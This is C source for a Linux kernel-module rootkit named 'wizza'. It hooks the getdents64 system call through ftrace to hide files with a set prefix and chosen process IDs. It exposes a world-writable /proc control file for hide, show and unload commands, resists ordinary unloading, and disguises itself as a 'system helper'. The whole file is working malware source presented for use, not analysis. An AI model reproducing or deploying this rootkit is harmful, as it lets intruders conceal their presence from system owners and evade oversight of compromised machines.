/*
 * wizza_rootkit.c — LKM rootkit for WiZZA
 * Capabilities:
 *   - Hides files/dirs with prefix HIDE_PREFIX from ls/find
 *   - Hides a process by PID (write PID to /proc/wizza_ctl)
 *   - Persists via /etc/modules or systemd (handled by installer)
 *   - Kill-switch: echo "unload" > /proc/wizza_ctl
 *
 * Build: make -C /lib/modules/$(uname -r)/build M=$PWD modules
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wizza");
MODULE_DESCRIPTION("system helper");
MODULE_VERSION("1.0");

#define HIDE_PREFIX   ".wizza_"
#define CTL_NAME      "wizza_ctl"
#define MAX_HIDE_PIDS 32

static int hide_pids[MAX_HIDE_PIDS];
static int hide_pid_count = 0;
static struct proc_dir_entry *ctl_entry;

/* ── ftrace hook infrastructure ──────────────────────────────────────── */
struct ftrace_hook {
    const char *name;
    void       *func;
    void       *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("wizza: unresolved: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *)hook->orig) = hook->address;
    return 0;
}

static void notrace fh_callback(unsigned long ip, unsigned long parent_ip,
                                struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long)hook->func;
}

static int fh_install(struct ftrace_hook *hook) {
    int err = fh_resolve(hook);
    if (err) return err;
    hook->ops.func  = fh_callback;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY |
                      FTRACE_OPS_FL_RECURSION;
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) return err;
    return register_ftrace_function(&hook->ops);
}

static void fh_remove(struct ftrace_hook *hook) {
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

/* ── getdents64 hook — hide files ─────────────────────────────────────── */
typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

static long hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *dirent = (void *)regs->si;
    struct linux_dirent64 *kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    if (copy_from_user(kbuf, dirent, ret)) { kvfree(kbuf); return ret; }

    long off = 0, new_len = 0;
    struct linux_dirent64 *cur;
    char *newbuf = kvmalloc(ret, GFP_KERNEL);
    if (!newbuf) { kvfree(kbuf); return ret; }

    while (off < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + off);
        int hide = 0;

        /* hide by file prefix */
        if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
            hide = 1;

        /* hide by PID (numeric dir name matching hidden pids) */
        if (!hide) {
            long pid = 0;
            if (kstrtol(cur->d_name, 10, &pid) == 0) {
                for (int i = 0; i < hide_pid_count; i++) {
                    if (hide_pids[i] == (int)pid) { hide = 1; break; }
                }
            }
        }

        if (!hide) {
            memcpy(newbuf + new_len, cur, cur->d_reclen);
            new_len += cur->d_reclen;
        }
        off += cur->d_reclen;
    }

    copy_to_user(dirent, newbuf, new_len);
    kvfree(kbuf); kvfree(newbuf);
    return new_len;
}

static struct ftrace_hook hooks[] = {
    { "__x64_sys_getdents64", hook_getdents64, &orig_getdents64 },
};

/* ── /proc/wizza_ctl — control interface ─────────────────────────────── */
static ssize_t ctl_write(struct file *f, const char __user *buf,
                          size_t len, loff_t *off)
{
    char kbuf[64] = {0};
    if (len >= sizeof(kbuf)) len = sizeof(kbuf) - 1;
    if (copy_from_user(kbuf, buf, len)) return -EFAULT;
    kbuf[len] = '\0';

    /* strip newline */
    char *nl = strchr(kbuf, '\n');
    if (nl) *nl = '\0';

    if (strcmp(kbuf, "unload") == 0) {
        /* kill-switch: unload module */
        fh_remove(&hooks[0]);
        proc_remove(ctl_entry);
        module_put(THIS_MODULE); /* allow unload */
        return len;
    }

    /* "hide <pid>" */
    if (strncmp(kbuf, "hide ", 5) == 0) {
        int pid = 0;
        if (kstrtoint(kbuf + 5, 10, &pid) == 0 && hide_pid_count < MAX_HIDE_PIDS) {
            hide_pids[hide_pid_count++] = pid;
        }
        return len;
    }

    /* "show <pid>" */
    if (strncmp(kbuf, "show ", 5) == 0) {
        int pid = 0;
        if (kstrtoint(kbuf + 5, 10, &pid) == 0) {
            for (int i = 0; i < hide_pid_count; i++) {
                if (hide_pids[i] == pid) {
                    hide_pids[i] = hide_pids[--hide_pid_count];
                    break;
                }
            }
        }
        return len;
    }

    return len;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops ctl_ops = { .proc_write = ctl_write };
#else
static const struct file_operations ctl_ops = { .write = ctl_write };
#endif

/* ── module init / exit ───────────────────────────────────────────────── */
static int __init wizza_init(void) {
    int err = fh_install(&hooks[0]);
    if (err) return err;

    ctl_entry = proc_create(CTL_NAME, 0222, NULL, &ctl_ops);
    if (!ctl_entry) {
        fh_remove(&hooks[0]);
        return -ENOMEM;
    }

    try_module_get(THIS_MODULE); /* prevent accidental rmmod without kill-switch */
    pr_info("wizza: loaded\n");
    return 0;
}

static void __exit wizza_exit(void) {
    fh_remove(&hooks[0]);
    proc_remove(ctl_entry);
    pr_info("wizza: unloaded\n");
}

module_init(wizza_init);
module_exit(wizza_exit);
